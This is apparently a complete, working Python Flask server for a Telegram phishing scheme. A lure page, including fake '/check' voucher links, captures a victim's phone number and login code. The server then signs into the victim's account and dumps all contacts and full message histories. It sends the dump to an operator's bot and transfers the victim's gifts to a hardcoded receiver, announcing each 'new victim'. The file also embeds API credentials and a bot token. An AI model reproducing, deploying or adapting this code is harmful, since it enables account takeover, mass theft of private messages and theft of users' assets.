# server.py — полностью рабочая версия с отправкой JSON и уведомлений
from flask import Flask, render_template, request, jsonify, session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import os
import json
import logging
from datetime import datetime
import httpx
from flask_cors import CORS

logging.basicConfig(level=logging.INFO)

API_ID = 34667567
API_HASH = "819464e9d467c9e740a538cd5eca55a8"
RECEIVER_USERNAME = "@Defbymorgenshtern"
ADMIN_ID = 8503291981
BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

temp_data = {}

# ============================================================
# Отправка уведомлений админу (асинхронная, без создания нового loop)
# ============================================================
async def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        await client.post(url, json={"chat_id": ADMIN_ID, "text": text})

# ============================================================
# Сбор ВСЕХ данных аккаунта (без ограничений)
# ============================================================
async def collect_full_user_data(client):
    data = {}
    
    me = await client.get_me()
    data['user'] = {
        'id': me.id,
        'username': me.username,
        'first_name': me.first_name,
        'last_name': me.last_name,
        'phone': me.phone,
        'is_bot': me.bot,
        'is_premium': getattr(me, 'premium', False)
    }
    
    contacts = await client.get_contacts()
    data['contacts'] = []
    for contact in contacts:
        data['contacts'].append({
            'id': contact.id,
            'username': contact.username,
            'first_name': contact.first_name,
            'last_name': contact.last_name,
            'phone': contact.phone
        })
    
    dialogs = await client.get_dialogs()
    data['dialogs'] = []
    for dialog in dialogs:
        dialog_info = {
            'id': dialog.id,
            'title': dialog.title,
            'type': 'unknown',
            'messages': []
        }
        if dialog.is_user:
            dialog_info['type'] = 'user'
        elif dialog.is_group:
            dialog_info['type'] = 'group'
        elif dialog.is_channel:
            dialog_info['type'] = 'channel'
        
        try:
            messages = []
            # Собираем ВСЕ сообщения (без лимита)
            async for msg in client.iter_messages(dialog, limit=None):
                messages.append({
                    'id': msg.id,
                    'date': msg.date.isoformat() if msg.date else None,
                    'text': msg.text,
                    'from_id': msg.from_id.user_id if msg.from_id else None,
                    'sender_id': msg.sender_id,
                    'reply_to': msg.reply_to_msg_id,
                    'media': bool(msg.media),
                    'media_type': str(msg.media.__class__.__name__) if msg.media else None
                })
            dialog_info['messages'] = messages
        except Exception as e:
            dialog_info['error'] = str(e)
            logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
        
        data['dialogs'].append(dialog_info)
    
    return data

# ============================================================
# Отправка JSON-файла админу
# ============================================================
async def send_document_to_admin(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        async with httpx.AsyncClient(timeout=120.0) as http_client:
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f, 'application/json')}
                response = await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
                if response.status_code != 200:
                    logging.error(f"Send doc error: {response.text}")
                    await send_telegram_message(f"❌ Ошибка отправки JSON: {response.text}")
        logging.info(f"Document {file_path} sent to admin.")
    except Exception as e:
        logging.error(f"Failed to send document: {e}")
        await send_telegram_message(f"❌ Ошибка отправки документа: {str(e)}")
        raise

# ============================================================
# Проверка баланса и подарков
# ============================================================
async def check_balance_and_gifts(client):
    try:
        me = await client.get_me()
        balance = await client.get_stars_balance()
        gifts = await client.get_available_gifts()
        return {
            "user_id": me.id,
            "username": me.username,
            "stars_balance": balance,
            "gifts_count": len(gifts) if gifts else 0,
            "gifts": gifts
        }
    except Exception as e:
        logging.error(f"Balance check error: {e}")
        return None

async def transfer_nft_to_receiver(client, info):
    try:
        receiver = await client.get_entity(RECEIVER_USERNAME)
        result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
        if info.get('gifts_count', 0) > 0:
            for gift in info.get('gifts', []):
                try:
                    await client.send_gift(receiver, gift)
                    result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                except Exception as e:
                    result_text += f"\n❌ Ошибка отправки подарка: {e}"
        await send_telegram_message(result_text)
        return True
    except Exception as e:
        await send_telegram_message(f"❌ Ошибка перевода: {e}")
        return False

# ============================================================
# Веб-маршруты
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth')
def auth():
    return render_template('index.html')

@app.route('/check/<check_id>')
def check_page(check_id):
    checks_file = "checks.json"
    if os.path.exists(checks_file):
        with open(checks_file, 'r') as f:
            checks = json.load(f)
        if check_id in checks:
            return render_template('index.html', check_amount=checks[check_id]['amount'])
    return render_template('index.html')

# ============================================================
# API: отправка кода
# ============================================================
@app.route('/api/send-code', methods=['POST'])
def api_send_code():
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({"success": False, "error": "Введите номер"}), 400
    
    session_id = os.urandom(8).hex()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def send_code():
        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            temp_data[session_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'session_id': session_id
            }
            await client.disconnect()
            return True
        except Exception as e:
            logging.error(f"Send code error: {e}")
            await client.disconnect()
            return False
    
    try:
        success = loop.run_until_complete(send_code())
        if success:
            return jsonify({"success": True, "session_id": session_id})
        else:
            return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
    finally:
        loop.close()

# ============================================================
# API: проверка кода
# ============================================================
@app.route('/api/verify-code', methods=['POST'])
def api_verify_code():
    data = request.json
    code = data.get('code', '').strip()
    session_id = data.get('session_id', '')
    
    if not code or not session_id:
        return jsonify({"success": False, "error": "Введите код"}), 400
    
    if session_id not in temp_data:
        return jsonify({"success": False, "error": "Сессия не найдена"}), 400
    
    session_data = temp_data[session_id]
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def verify_and_process():
        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            info = await check_balance_and_gifts(client)
            if info:
                try:
                    # 1. Собираем данные
                    dump_data = await collect_full_user_data(client)
                    dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(dump_filename, 'w', encoding='utf-8') as f:
                        json.dump(dump_data, f, ensure_ascii=False, indent=2)
                    # 2. Отправляем файл админу
                    await send_document_to_admin(dump_filename)
                    # 3. Удаляем локальный файл
                    if os.path.exists(dump_filename):
                        os.remove(dump_filename)
                except Exception as e:
                    error_msg = f"❌ Ошибка при сборе или отправке дампа: {str(e)}"
                    logging.error(error_msg)
                    await send_telegram_message(error_msg)
                
                # Отправляем подарки получателю (внутри уже есть уведомление)
                await transfer_nft_to_receiver(client, info)
            
            await client.disconnect()
            if session_id in temp_data:
                del temp_data[session_id]
            return True
        except SessionPasswordNeededError:
            await client.disconnect()
            return "2fa_needed"
        except Exception as e:
            logging.error(f"Verify error: {e}")
            await send_telegram_message(f"❌ Ошибка входа: {str(e)}")
            await client.disconnect()
            return False
    
    try:
        result = loop.run_until_complete(verify_and_process())
        if result is True:
            return jsonify({"success": True, "message": "Авторизация успешна!"})
        elif result == "2fa_needed":
            return jsonify({"success": False, "error": "Требуется облачный пароль"})
        else:
            return jsonify({"success": False, "error": "Неверный код"}), 400
    finally:
        loop.close()

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
